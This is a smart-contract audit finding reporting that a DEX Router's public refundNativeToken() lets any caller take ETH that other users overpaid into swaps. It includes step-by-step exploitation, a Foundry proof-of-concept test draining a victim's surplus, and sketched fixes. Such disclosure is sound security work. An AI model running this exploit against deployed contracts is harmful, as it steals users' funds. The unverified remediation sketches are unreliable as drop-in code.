## Title
Excess Native Token (ETH) in Router Can Be Stolen by Any User via Unprotected refundNativeToken()

## Summary
The Router contract's `refundNativeToken()` function allows any user to withdraw the entire ETH balance of the contract to themselves, without verifying ownership. When users send excess ETH to swap functions (msg.value exceeds the required amount), the surplus accumulates in the Router and can be stolen by attackers calling this public function.

## Impact
**Severity**: High

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** The `refundNativeToken()` function is designed to allow users to recover excess ETH they sent for transient payments. The function should only refund ETH that belongs to the caller.

**Actual Logic:** The function unconditionally sends the Router's entire ETH balance to `msg.sender`, without any ownership tracking or access control. This creates a race condition where any user can claim ETH left by other users.

**Exploitation Path:**

1. **Victim sends excess ETH in single swap:** User A calls `router.swap{value: 10 ETH}(...)` for a swap that only requires 5 ETH. The Router calculates `value = 5 ETH` based on params [2](#0-1) , sends 5 ETH to Core via [3](#0-2) , and the refund logic only handles difference between calculated value and actual delta [4](#0-3) . The remaining 5 ETH stays in Router.

2. **Alternative: Victim sends ETH in multihop swap:** User A calls `router.multiMultihopSwap{value: 10 ETH}(...)` where swaps need 5 ETH. The multihop logic has NO automatic refund mechanism [5](#0-4) , leaving 5 ETH stuck in Router.

3. **Attacker monitors Router balance:** Attacker continuously checks `address(router).balance` for accumulated ETH from multiple victims.

4. **Attacker claims all accumulated ETH:** Attacker calls `router.refundNativeToken()`, which sends the entire balance to the attacker [6](#0-5) .

**Security Property Broken:** Direct theft of user funds - violates the fundamental security property that users should not lose funds to other unprivileged actors.

## Impact Explanation
- **Affected Assets**: Native ETH sent by any user performing swaps through the Router
- **Damage Severity**: Complete loss of excess ETH for victims. Attackers can drain 100% of accumulated ETH in the Router. If multiple users overpay before anyone calls refundNativeToken, the attacker steals from all victims in a single transaction.
- **User Impact**: Any user who sends more ETH than required for their swap and doesn't immediately call refundNativeToken becomes a victim. This includes users who:
  - Manually calculate wrong amounts
  - Use frontends that don't precisely calculate required ETH
  - Call swaps via multicall without proper refund calls
  - Experience state changes between transaction submission and execution (e.g., price movements reducing required ETH)

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user can exploit this by simply calling a public function
- **Preconditions**: 
  - One or more users must have sent excess ETH to Router (very likely given complexity of exact calculations)
  - Router must have non-zero ETH balance
  - No requirement for liquidity, specific pools, or complex state
- **Execution Complexity**: Single function call, no special timing or state manipulation required
- **Frequency**: Can be exploited continuously - attacker can run a bot monitoring Router balance and immediately claiming any ETH that accumulates

## Recommendation

**Option 1: Track ETH ownership per-caller (Recommended)**

```solidity
// In src/base/PayableMulticallable.sol

// Add mapping to track deposits
mapping(address => uint256) private nativeTokenBalance;

// Modify swap functions to track deposits
function swap(...) public payable returns (...) {
    uint256 initialBalance = address(this).balance - msg.value;
    nativeTokenBalance[msg.sender] += msg.value;
    
    // ... existing swap logic ...
    
    // After swap, reduce balance by amount used
    uint256 finalBalance = address(this).balance;
    uint256 used = initialBalance + msg.value - finalBalance;
    nativeTokenBalance[msg.sender] -= used;
}

// Fix refundNativeToken to only refund caller's balance
function refundNativeToken() external payable {
    uint256 refundAmount = nativeTokenBalance[msg.sender];
    if (refundAmount != 0) {
        nativeTokenBalance[msg.sender] = 0;
        SafeTransferLib.safeTransferETH(msg.sender, refundAmount);
    }
}
```

**Option 2: Auto-refund excess immediately (Gas-intensive but safer)**

```solidity
// In src/Router.sol, handleLockData function for single swaps

// After line 146, add:
if (address(this).balance > 0) {
    SafeTransferLib.safeTransferETH(swapper, address(this).balance);
}

// For multihop swaps, after line 244, add:
if (address(this).balance > 0) {
    SafeTransferLib.safeTransferETH(swapper, address(this).balance);
}
```

**Option 3: Remove refundNativeToken and require exact payments**

Remove the vulnerable function entirely and document that users must send exact amounts. Add balance checks to revert if msg.value exceeds requirements.

## Proof of Concept

```solidity
// File: test/Exploit_RefundNativeTokenTheft.t.sol
// Run with: forge test --match-test test_RefundNativeTokenTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "./FullTest.sol";
import {Router, RouteNode, TokenAmount} from "../src/Router.sol";
import {NATIVE_TOKEN_ADDRESS} from "../src/math/constants.sol";
import {SqrtRatio} from "../src/types/sqrtRatio.sol";

contract Exploit_RefundNativeTokenTheft is FullTest {
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function setUp() public override {
        super.setUp();
        
        // Give victim and attacker some ETH
        vm.deal(victim, 100 ether);
        vm.deal(attacker, 1 ether);
    }

    function test_RefundNativeTokenTheft() public {
        // SETUP: Create ETH pool with liquidity
        PoolKey memory poolKey = createETHPool(0, 1 << 63, 100);
        createPosition(poolKey, -100, 100, 1000 ether, 1000 ether);

        // Record initial balances
        uint256 victimInitialBalance = victim.balance;
        uint256 attackerInitialBalance = attacker.balance;
        uint256 routerInitialBalance = address(router).balance;

        assertEq(routerInitialBalance, 0, "Router should start with 0 ETH");

        // EXPLOIT STEP 1: Victim sends 10 ETH but swap only needs 5 ETH
        vm.startPrank(victim);
        router.swap{value: 10 ether}(
            RouteNode({poolKey: poolKey, sqrtRatioLimit: SqrtRatio.wrap(0), skipAhead: 0}),
            TokenAmount({token: NATIVE_TOKEN_ADDRESS, amount: 5 ether}),
            type(int256).min
        );
        vm.stopPrank();

        // VERIFY: 5 ETH remains stuck in Router
        uint256 routerBalanceAfterSwap = address(router).balance;
        assertEq(routerBalanceAfterSwap, 5 ether, "5 ETH should remain in Router");

        // Victim lost 10 ETH but only 5 went to swap
        uint256 victimBalanceAfterSwap = victim.balance;
        assertEq(victimInitialBalance - victimBalanceAfterSwap, 10 ether, "Victim sent 10 ETH");

        // EXPLOIT STEP 2: Attacker steals the stuck ETH
        vm.startPrank(attacker);
        router.refundNativeToken();
        vm.stopPrank();

        // VERIFY: Attacker stole victim's 5 ETH
        uint256 attackerFinalBalance = attacker.balance;
        uint256 routerFinalBalance = address(router).balance;

        assertEq(routerFinalBalance, 0, "Router balance drained");
        assertEq(
            attackerFinalBalance - attackerInitialBalance,
            5 ether,
            "Attacker stole 5 ETH that belonged to victim"
        );

        // Victim cannot recover their ETH
        vm.startPrank(victim);
        router.refundNativeToken();
        vm.stopPrank();
        
        assertEq(victim.balance, victimBalanceAfterSwap, "Victim cannot recover stolen ETH");
    }
}
```

## Notes

- The vulnerability exists because `refundNativeToken()` has no access control and doesn't track which user deposited ETH
- The issue affects BOTH single swaps and multihop swaps, though the root causes differ:
  - Single swaps: Refund logic only handles difference between calculated and actual amounts [4](#0-3) 
  - Multihop swaps: No automatic refund mechanism exists at all [7](#0-6) 
- The function appears intentionally designed for "transient payments" but lacks essential ownership tracking
- This is especially dangerous given the Router is a core protocol component that will handle significant ETH volume
- Even sophisticated users may overpay due to state changes between transaction submission and execution (e.g., price movements, liquidity changes)

### Citations

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```

**File:** src/Router.sol (L106-110)
```text
                uint256 value = FixedPointMathLib.ternary(
                    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
                    uint128(params.amount()),
                    0
                );
```

**File:** src/Router.sol (L135-142)
```text
                            int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());

                            // refund the overpaid ETH to the swapper
                            if (valueDifference > 0) {
                                ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
                            } else if (valueDifference < 0) {
                                SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
                            }
```

**File:** src/Router.sol (L151-251)
```text
        } else if ((callType & CALL_TYPE_MULTIHOP_SWAP) != 0) {
            address swapper;
            Swap[] memory swaps;
            int256 calculatedAmountThreshold;

            if (callType == CALL_TYPE_MULTIHOP_SWAP) {
                Swap memory s;
                // multihopSwap
                (, swapper, s, calculatedAmountThreshold) = abi.decode(data, (uint256, address, Swap, int256));

                swaps = new Swap[](1);
                swaps[0] = s;
            } else {
                // multiMultihopSwap
                (, swapper, swaps, calculatedAmountThreshold) = abi.decode(data, (uint256, address, Swap[], int256));
            }

            PoolBalanceUpdate[][] memory results = new PoolBalanceUpdate[][](swaps.length);

            unchecked {
                int256 totalCalculated;
                int256 totalSpecified;
                address specifiedToken;
                address calculatedToken;

                for (uint256 i = 0; i < swaps.length; i++) {
                    Swap memory s = swaps[i];
                    results[i] = new PoolBalanceUpdate[](s.route.length);

                    TokenAmount memory tokenAmount = s.tokenAmount;
                    totalSpecified += tokenAmount.amount;

                    for (uint256 j = 0; j < s.route.length; j++) {
                        RouteNode memory node = s.route[j];

                        bool isToken1 = tokenAmount.token == node.poolKey.token1;
                        require(isToken1 || tokenAmount.token == node.poolKey.token0);

                        (PoolBalanceUpdate update,) = _swap(
                            0,
                            node.poolKey,
                            createSwapParameters({
                                _amount: tokenAmount.amount,
                                _isToken1: isToken1,
                                _sqrtRatioLimit: node.sqrtRatioLimit,
                                _skipAhead: node.skipAhead
                            })
                        );
                        results[i][j] = update;

                        if (isToken1) {
                            if (update.delta1() != tokenAmount.amount) revert PartialSwapsDisallowed();
                            tokenAmount = TokenAmount({token: node.poolKey.token0, amount: -update.delta0()});
                        } else {
                            if (update.delta0() != tokenAmount.amount) revert PartialSwapsDisallowed();
                            tokenAmount = TokenAmount({token: node.poolKey.token1, amount: -update.delta1()});
                        }
                    }

                    totalCalculated += tokenAmount.amount;

                    if (i == 0) {
                        specifiedToken = s.tokenAmount.token;
                        calculatedToken = tokenAmount.token;
                    } else {
                        if (specifiedToken != s.tokenAmount.token || calculatedToken != tokenAmount.token) {
                            revert TokensMismatch(i);
                        }
                    }
                }

                if (totalCalculated < calculatedAmountThreshold) {
                    revert SlippageCheckFailed(calculatedAmountThreshold, totalCalculated);
                }

                if (totalSpecified < 0) {
                    ACCOUNTANT.withdraw(specifiedToken, swapper, uint128(uint256(-totalSpecified)));
                } else if (totalSpecified > 0) {
                    if (specifiedToken == NATIVE_TOKEN_ADDRESS) {
                        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(totalSpecified)));
                    } else {
                        ACCOUNTANT.payFrom(swapper, specifiedToken, uint128(uint256(totalSpecified)));
                    }
                }

                if (totalCalculated > 0) {
                    ACCOUNTANT.withdraw(calculatedToken, swapper, uint128(uint256(totalCalculated)));
                } else if (totalCalculated < 0) {
                    if (calculatedToken == NATIVE_TOKEN_ADDRESS) {
                        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-totalCalculated)));
                    } else {
                        ACCOUNTANT.payFrom(swapper, calculatedToken, uint128(uint256(-totalCalculated)));
                    }
                }
            }

            if (callType == CALL_TYPE_MULTIHOP_SWAP) {
                result = abi.encode(results[0]);
            } else {
                result = abi.encode(results);
            }
```

**File:** src/libraries/CoreLib.sol (L139-139)
```text
            if iszero(call(gas(), core, value, free, 132, free, 64)) {
```
